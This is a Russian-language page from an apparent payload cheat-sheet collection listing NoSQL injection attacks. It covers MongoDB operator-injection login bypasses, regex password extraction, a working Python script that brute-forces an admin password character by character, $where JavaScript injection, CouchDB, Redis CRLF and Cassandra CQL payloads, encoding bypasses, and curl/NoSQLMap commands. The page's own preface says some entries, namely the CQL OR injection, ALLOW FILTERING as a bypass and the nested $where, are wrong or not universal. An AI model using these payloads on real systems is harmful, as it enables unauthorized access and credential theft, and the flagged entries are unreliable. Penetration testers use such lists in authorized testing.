<a id="-nosql-injection-payloads"></a>
# 🍃 Полезные нагрузки для NoSQL-инъекций

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../NoSQL-Injection.md)

> **Уточнение к оригиналу.** Операторы работают только при соответствующей обработке ввода приложением; изменение параметров само по себе не доказывает обход. `$where` — [оператор верхнего уровня MongoDB](https://www.mongodb.com/docs/manual/reference/operator/query/where/), поэтому вложенный пример под username не универсален. CQL не повторяет SQL: в [грамматике Cassandra WHERE](https://cassandra.apache.org/doc/latest/cassandra/developing/cql/dml.html) нет показанного OR, а ALLOW FILTERING не является обходом авторизации. Сохранённые Python-примеры также требуют адаптации к формату ответа и обработке regex. Блоки JSON с комментариями // иллюстративны и не являются строгим JSON.

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-mongodb-injection"></a>
## 🎯 Инъекция MongoDB

<a id="authentication-bypass"></a>
### Обход аутентификации
```javascript
// Внедрение JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL-кодирование
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

<a id="common-operators"></a>
### Распространённые операторы
```javascript
$eq     // Равно
$ne     // Не равно
$gt     // Больше
$gte    // Больше или равно
$lt     // Меньше
$lte    // Меньше или равно
$in     // Входит в массив
$nin    // Не входит в массив
$regex  // Регулярное выражение
$exists // Field exists
$or     // Логическое ИЛИ
$and    // Логическое И
$where  // Выражение JavaScript
```

---

<a id="-basic-payloads"></a>
## 💉 Базовые полезные нагрузки

<a id="url-parameter-injection"></a>
### Внедрение через параметры URL
```
# Обход аутентификации
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Всегда истинные условия
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

<a id="json-body-injection"></a>
### Внедрение через тело JSON
```json
// Базовый обход
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Обход с помощью регулярного выражения
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Условие ИЛИ
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Больше
{"username": "admin", "password": {"$gt": ""}}
```

---

<a id="-data-extraction"></a>
## 🔥 Извлечение данных

<a id="regex-based-extraction"></a>
### Извлечение с помощью регулярных выражений
```javascript
// Извлекать пароль посимвольно
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Извлечение с учётом позиции
password[$regex]=^.{0}a.*   // Первый символ — 'a'?
password[$regex]=^.{1}b.*   // Второй символ — 'b'?

// Типичные символы
password[$regex]=^[a-z].*   // Начинается со строчной буквы
password[$regex]=^[A-Z].*   // Начинается с прописной буквы
password[$regex]=^[0-9].*   // Начинается с цифры
```

<a id="blind-boolean-extraction-script"></a>
### Скрипт слепого извлечения по логическим условиям
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

<a id="-advanced-payloads"></a>
## 🚀 Расширенные полезные нагрузки

<a id="where-javascript-injection"></a>
### Внедрение JavaScript через $where
```javascript
// На основе задержки (слепой метод)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Извлечение данных
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// На основе ошибок
{"$where": "this.constructor.constructor('return this.password')()"}
```

<a id="array-injection"></a>
### Внедрение массивов
```json
// Оператор $in
{"username": {"$in": ["admin", "administrator", "root"]}}

// Оператор $nin
{"username": {"$nin": ["guest", "anonymous"]}}
```

<a id="operator-injection"></a>
### Внедрение операторов
```
# Превратить поле в оператор
username=admin&password[$ne]=wrongpassword

# Вложенный оператор
username[$eq]=admin&password[$regex]=^p

# Несколько операторов
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

<a id="-couchdb-injection"></a>
## 🍃 Инъекция CouchDB

<a id="basic-payloads"></a>
### Базовые полезные нагрузки
```javascript
// Обход аутентификации
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Регулярное выражение
{"selector": {"username": {"$regex": ".*"}}}

// Больше
{"selector": {"password": {"$gt": null}}}
```

<a id="view-injection"></a>
### Внедрение в представления
```javascript
// Внедрение в запрос Mango
{"selector": {"_id": {"$gt": null}}}

// Получить все документы
{"selector": {"_id": {"$regex": ".*"}}}
```

---

<a id="-redis-injection"></a>
## 🔴 Инъекция Redis

<a id="basic-commands"></a>
### Базовые команды
```redis
# Перечисление ключей
KEYS *
SCAN 0

# Извлечение данных
GET key_name
HGETALL hash_name

# Записать данные
SET key value
HSET hash field value
```

<a id="command-injection-via-app"></a>
### Инъекция команд через приложение
```
# Если пользовательский ввод передаётся в команды Redis
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

<a id="-cassandra-injection"></a>
## 📊 Инъекция Cassandra

<a id="cql-injection"></a>
### CQL-инъекция
```sql
-- Базовая инъекция
' OR '1'='1
' OR ''='

-- Обход через ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Внедрение комментариев
admin'--
admin'/*
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Способы обхода

<a id="url-encoding"></a>
### URL-кодирование
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

<a id="unicode-bypass"></a>
### Обход с помощью Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

<a id="array-syntax-variations"></a>
### Варианты синтаксиса массивов
```
# Стандартный вариант
password[$ne]=

# Альтернативный вариант
password[0][$ne]=
password[][$ne]=
```

<a id="content-type-manipulation"></a>
### Изменение Content-Type
```
# Заменить формат формы на JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

<a id="-injection-points"></a>
## 📝 Точки внедрения

```
POST /login
- Параметры тела (JSON/форма)
- Параметры строки запроса

GET /users?id=
- Параметры запроса

Заголовки:
- Authorization
- Значения cookies

Конечные точки API:
- GraphQL с базой MongoDB
- Фильтры REST API
```

---

<a id="-detection-checklist"></a>
## 🔍 Список проверок обнаружения

```markdown
□ Проверить оператор $ne: {"field": {"$ne": ""}}
□ Проверить оператор $gt: {"field": {"$gt": ""}}
□ Проверить $regex: {"field": {"$regex": ".*"}}
□ Проверить $where: {"$where": "1==1"}
□ Проверить синтаксис массивов в URL: field[$ne]=
□ Проверить операторы JSON
□ Проверить различия времени ответа
□ Проверить различия длины ответа
□ Проверить разные типы содержимого
```

---

<a id="-tools"></a>
## 🔗 Инструменты

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Сканер инъекций MongoDB
nuclei -t nosql-injection.yaml -u http://target

# Ручная проверка через curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

<a id="-related-payloads"></a>
## 🔗 Связанные полезные нагрузки

- [Полезные нагрузки SQLi](SQLi.ru.md)
- [Инъекция GraphQL](GraphQL-Injection.ru.md)

---

**Вернуться к полезным нагрузкам:** [💉 Коллекция полезных нагрузок](../../README.ru.md#category-18)
